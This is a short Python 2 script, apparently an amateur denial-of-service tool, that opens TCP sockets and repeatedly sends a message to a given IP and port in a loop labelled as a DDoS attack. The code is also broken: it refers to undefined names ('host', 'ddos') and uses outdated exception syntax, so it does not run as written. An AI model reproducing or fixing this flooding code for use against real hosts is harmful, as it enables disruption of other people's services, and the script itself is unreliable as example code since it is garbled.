import os
import sys
import socket

def attack(message, ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((host, 80))
		s.send(message)
		s.sendto(message, (ip, port))
		ddos.send(message)
	except socket.error, msg:
		print ("DDoS failed" + msg)
		sys.exit(1)
	s.close()

# attempts => int
# message => str
# ip => str
# port => int
def attempts(attempts, message, ip, port):
	for i in range(0, attempts):
		attack(message, ip, port)